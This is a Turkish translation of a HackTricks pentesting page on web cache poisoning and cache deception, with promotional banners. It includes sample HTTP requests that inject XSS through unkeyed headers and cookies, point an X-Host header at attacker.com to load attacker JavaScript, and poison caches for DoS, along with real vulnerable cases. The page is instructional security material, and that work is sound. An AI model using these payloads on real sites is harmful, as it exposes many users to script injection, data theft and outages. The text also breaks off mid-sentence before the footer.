# Önbellek Zehirlenmesi ve Önbellek Aldatma

<details>

<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR göndererek paylaşın.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin** için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Fark

> **Web önbellek zehirlenmesi ile web önbellek aldatma arasındaki fark nedir?**
>
> * **Web önbellek zehirlenmesinde**, saldırgan uygulamanın önbelleğine zararlı içerik depolamasına neden olur ve bu içerik önbellekten diğer uygulama kullanıcılarına sunulur.
> * **Web önbellek aldatmasında**, saldırgan uygulamanın önbelleğine başka bir kullanıcıya ait hassas içerik depolamasına neden olur ve saldırgan daha sonra bu içeriği önbellekten alır.

## Önbellek Zehirlenmesi

Önbellek zehirlenmesi, istemci tarafındaki önbelleği manipüle etmeyi amaçlayarak istemcilerin beklenmeyen, kısmi veya saldırganın kontrolü altındaki kaynakları yüklemesini zorlar. Etkilenen sayfanın popülerliğine bağlı olarak etkisi değişir, çünkü kirletilmiş yanıt sadece önbellek kirliliği döneminde sayfayı ziyaret eden kullanıcılara sunulur.

Önbellek zehirlenmesi saldırısının gerçekleştirilmesi birkaç adımı içerir:

1. **Anahtarlanmamış Girişlerin Belirlenmesi**: Bu, önbelleğe alınması için gerekli olmasa da, sunucu tarafından döndürülen yanıtı değiştirebilen parametrelerdir. Bu girişlerin belirlenmesi, önbelleği manipüle etmek için sömürülebileceği için önemlidir.

2. **Anahtarlanmamış Girişlerin Sömürülmesi**: Anahtarlanmamış girişleri belirledikten sonra, bir sonraki adım saldırganın yararına sunucunun yanıtını nasıl değiştireceğini anlamaktır.

3. **Zehirli Yanıtın Önbelleğe Alınmasının Sağlanması**: Son adım, manipüle edilmiş yanıtın önbelleğe alınmasını sağlamaktır. Böylece, önbellek zehirlenmesi sırasında etkilenen sayfaya erişen herhangi bir kullanıcı kirletilmiş yanıtı alır.

### Keşif: HTTP başlıklarını kontrol edin

Genellikle, bir yanıtın **önbelleğe alındığı** durumlarda buna işaret eden bir **başlık olacaktır**, hangi başlıklara dikkat etmeniz gerektiğini bu yazıda kontrol edebilirsiniz: [**HTTP Önbellek başlıkları**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Keşif: 400 kodunu önbelleğe alın

Eğer yanıtın bir önbelleğe alındığını düşünüyorsanız, **kötü bir başlıkla** istek göndermeyi deneyebilirsiniz, bu da bir **400 durum koduyla** yanıtlanmalıdır. Ardından isteği normal olarak erişmeyi deneyin ve yanıtın bir 400 durum kodu olup olmadığını kontrol edin, bu durumda zafiyetli olduğunu bilirsiniz (ve hatta bir DoS gerçekleştirebilirsiniz).\
Kötü yapılandırılmış bir başlık sadece `\:` olabilir.\
_Unutmayın, bazen bu tür durum kodları önbelleğe alınmaz, bu yüzden bu test işe yaramaz olabilir._

### Keşif: Anahtarlanmamış girişleri belirleme ve değerlendirme

[**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) kullanarak, sayfanın yanıtını değiştirebilecek parametreleri ve başlıkları **brute-force** yöntemiyle bulabilirsiniz. Örneğin, bir sayfa, betiği oradan yüklemek için `X-Forwarded-For` başlığını kullanabilir:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Zararlı bir yanıtı arka uç sunucudan elde etmek

Belirlenen parametre/başlık ile nasıl "temizlendiğini" ve hangi yerlerde yanıtı etkilediğini kontrol edin. Herhangi bir şekilde kötüye kullanabilir misiniz (XSS gerçekleştirmek veya sizin tarafınızdan kontrol edilen bir JS kodu yüklemek? DoS gerçekleştirmek?...)

### Yanıtı önbelleğe almak

Kötüye kullanılabilecek sayfayı, hangi parametrenin/başlığın kullanılacağını ve nasıl kötüye kullanılacağını belirledikten sonra, sayfayı önbelleğe almanız gerekmektedir. Önbelleğe alınması gereken kaynağa bağlı olarak, bu biraz zaman alabilir, birkaç saniye boyunca denemek zorunda kalabilirsiniz.\
Yanıttaki **`X-Cache`** başlığı, isteğin önbelleğe alınmadığı durumlarda **`miss`** değerine sahip olabilirken, önbelleğe alındığında **`hit`** değerine sahip olabilir.\
**`Cache-Control`** başlığı da kaynağın önbelleğe alınıp alınmadığını ve kaynağın bir sonraki önbelleğe alınma zamanını bilmek için ilginç olabilir: `Cache-Control: public, max-age=1800`\
Başka bir ilginç başlık ise **`Vary`** başlığıdır. Bu başlık, genellikle anahtarlanmamış olsalar bile, önbellek anahtarı olarak kabul edilen ek başlıkları belirtmek için kullanılır. Bu nedenle, saldırgan, hedeflediği kurbanın `User-Agent`'ını biliyorsa, o belirli `User-Agent`'ı kullanan kullanıcılar için önbelleği zehirleyebilir.\
Önbellekle ilgili bir başka başlık ise **`Age`** başlığıdır. Bu, nesnenin proxy önbelleğinde kaç saniye boyunca bulunduğunu tanımlar.

Bir isteği önbelleğe alırken, kullanılan başlıklara **dikkat edin**, çünkü bazıları beklenmedik şekilde **anahtar olarak kullanılabilir** ve kurbanın aynı başlığı kullanması gerekebilir. Bir Önbellek Zehirleme işlemini her zaman farklı tarayıcılarla **test edin** ve çalışıp çalışmadığını kontrol edin.

## Sömürü Örnekleri

### En kolay örnek

`X-Forwarded-For` gibi bir başlık yanıtta temizlenmeden yansıtılıyor.\
Basit bir XSS yükü gönderebilir ve önbelleği zehirleyebilirsiniz, böylece sayfaya erişen herkes XSS saldırısına uğrayacaktır:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Not: Bu, `/en` yerine `/en?region=uk` isteğini zehirleyecektir._

### Çerez işleme açıklarını sömürmek için web önbellek zehirleme kullanma

Çerezler aynı zamanda bir sayfanın yanıtında da yansıtılabilir. Örneğin, bir XSS'e neden olmak için bunu istismar edebilirseniz, kötü amaçlı önbellek yanıtını yükleyen birkaç istemciyi XSS'i sömürme yeteneğine sahip olabilirsiniz.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Not: Eğer savunmasız çerez kullanıcılar tarafından çok kullanılıyorsa, düzenli istekler önbelleği temizleyecektir.

### Web önbellek zehirlenmesi açıklarını sömürmek için birden fazla başlık kullanma <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Bazen bir önbelleği istismar etmek için birden fazla anahtarlanmamış girişi sömürmeniz gerekebilir. Örneğin, `X-Forwarded-Host`'u sizin kontrolünüzde olan bir alan adına ve `X-Forwarded-Scheme`'i `http` olarak ayarlarsanız, bir **Açık yönlendirme** bulabilirsiniz. **Eğer** sunucu **tüm** **HTTP** isteklerini **HTTPS'ye yönlendiriyorsa** ve yönlendirme için alan adı olarak `X-Forwarded-Scheme` başlığını kullanıyorsa. Yönlendirmenin nereye yapıldığını kontrol edebilirsiniz.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Sınırlı `Vary` başlığıyla istismar etmek

Eğer **`X-Host`** başlığının, bir JS kaynağını yüklemek için **alan adı olarak kullanıldığını** ve yanıtta bulunan **`Vary`** başlığının **`User-Agent`** olduğunu tespit ettiyseniz. O zaman, kurbanın User-Agent'ını dışarı çıkarmak ve bu kullanıcı ajanını kullanarak önbelleği zehirlemek için bir yol bulmanız gerekmektedir:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### HTTP İstek Smuggling'i Kullanarak HTTP Önbellek Zehirlenmesi Saldırılarını Sömürme

[HTTP İstek Smuggling'i kullanarak web önbellek zehirlenmesi](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning) saldırılarını nasıl gerçekleştireceğinizi buradan öğrenin.

### Web Önbellek Zehirlenmesi için Otomatik Test

[Web Önbellek Zafiyet Tarayıcısı](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner), web önbellek zehirlenmesi için otomatik test yapmak için kullanılabilir. Birçok farklı teknik destekler ve yüksek özelleştirilebilir.

Örnek kullanım: `wcvs -u example.com`

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını** kolayca oluşturmak ve otomatikleştirmek için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Zafiyetli Örnekler

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS, URL içindeki parçayı silmeden yönlendirdi ve önbellek anahtarını yalnızca ana bilgisayar, yol ve sorgu kullanarak oluşturdu (parçayı görmezden geldi). Bu nedenle, `/#/../?r=javascript:alert(1)` isteği `/#/../?r=javascript:alert(1)` olarak arka uca gönderildi ve önbellek anahtarı içinde yalnızca ana bilgisayar, yol ve sorgu bulunuyordu.

### GitHub CP-DoS

İçerik türü başlığında yanlış bir değer göndermek, önbelleğe alınmış bir 405 yanıtını tetikledi. Önbellek anahtarı çerez içerdiği için yalnızca yetkisiz kullanıcılara saldırı yapmak mümkündü.

### GitLab + GCP CP-DoS

GitLab, statik içeriği depolamak için GCP kovalarını kullanır. **GCP Kovaları**, **`x-http-method-override`** başlığını destekler. Bu nedenle, `x-http-method-override: HEAD` başlığı göndermek ve önbelleği zehirlemek için boş bir yanıt gövdesi döndürmek mümkündü. Ayrıca `PURGE` yöntemini de destekleyebilir.

### Rack Middleware (Ruby on Rails)

Ruby on Rails uygulamalarında genellikle Rack ara yazılımı kullanılır. Rack kodunun amacı, **`x-forwarded-scheme`** başlığının değerini almak ve isteğin şeması olarak ayarlamaktır. `x-forwarded-scheme: http` başlığı gönderildiğinde, aynı konuma bir 301 yönlendirmesi gerçekleşir ve bu, kaynak üzerinde bir Hizmet Reddi (DoS) oluşturabilir. Ayrıca, uygulama `X-forwarded-host` başlığını kabul edebilir ve kullanıcıları belirtilen ana bilgisayara yönlendirebilir. Bu davranış, saldırganın sunucusundan JavaScript dosyalarının yüklenmesine ve güvenlik riski oluşturmasına neden olabilir.

### 403 ve Depolama Kovaları

Cloudflare önceden 403 yanıtlarını önbelleğe alıyordu. Yanlış Yetkilendirme başlıklarıyla S3 veya Azure Depolama Kovalarına erişmeye çalışmak, önbelleğe alınan bir 403 yanıtına neden olurdu. Cloudflare 403 yanıtlarını önbelleğe almamayı durdurmuş olsa da, bu davranış başka proxy hizmetlerinde hala mevcut olabilir.

### Anahtar Parametreleri Enjekte Etme

Önbellekler genellikle özel GET parametrelerini önbellek anahtarına dahil eder. Örneğin, Fastly'nin Varnish'i isteklerde `size` parametresini önbelleğe alır. Ancak, hatalı bir değerle birlikte URL kodlanmış bir sürümü (örneğin, `siz%65`) gönderildiğinde, önbellek anahtarı doğru `size` parametresini kullanarak oluşturulur. Ancak, arka uç, URL kodlu parametrenin değerini işler. İkinci `size` parametresini URL kodlamak, önbellek tarafından atlanmasına ve arka uç tarafından kullanılmasına neden olur. Bu parametreye 0 değeri atamak, önbelleğe alınabilir bir 400 Hatalı İstek hatası elde edilmesine neden olur.

### Kullanıcı Aracı Kuralları

Bazı geliştiriciler, FFUF veya Nuclei gibi yüksek trafikli araçların kullanıcı araçlarıyla eşleşen istekleri engeller. İlginç bir şekilde, bu yaklaşım önbellek zehirlenmesi ve DoS gibi zafiyetlere neden olabilir.

### Yasadışı Başlık Alanları

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230), başlık adlarında kabul edilebilir karakterleri belirtir. Belirtilen **tchar** aralığı dışındaki karakterler içeren başlıklar, ideal olarak 400 Hatalı İstek yanıtını tetiklemelidir. Uygulamada sunucular her zaman bu standarta uymaz. Önemli bir örnek, geçersiz karakterler içeren başlıkları ileten ve `cache-control` başlığı bulunmadığı sürece herhangi bir 400 hatasını önbelleğe alan Akamai'dir. `\` gibi geçersiz bir karakter içeren bir başlık göndermenin, önbelleğe alınabilir bir 400 Hatalı İstek hatası elde edilmesine neden olduğu bir sömürülebilir desen belirlendi.

### Yeni Başlıklar Bulma

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Önbellek Aldatma

Önbellek Aldatma'nın amacı, istemcilerin **duyarlı bilgileriyle birlikte önbelleğe kaydedilecek kaynakları yüklemesini sağlamaktır**.

Öncelikle, `.css`, `.js`, `.png` gibi **uzantıların** genellikle **önbelleğe kaydedilmesi** için **yapılandırıldığını** unutmayın. Bu nedenle, `www.example.com/profile.php/nonexistent.js`'ye erişirseniz, önbellek muhtemelen yanıtı kaydedecektir çünkü `.js` **uzantısını** görür. Ancak, **uygulama**, _www.example.com/profile.php_ içinde depolanan **duyarlı** kullanıcı içeriğiyle yeniden oynatıyorsa, bu içeriği diğer kullanıcılardan **çalabilirsiniz**.

Test edilecek diğer şey
<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
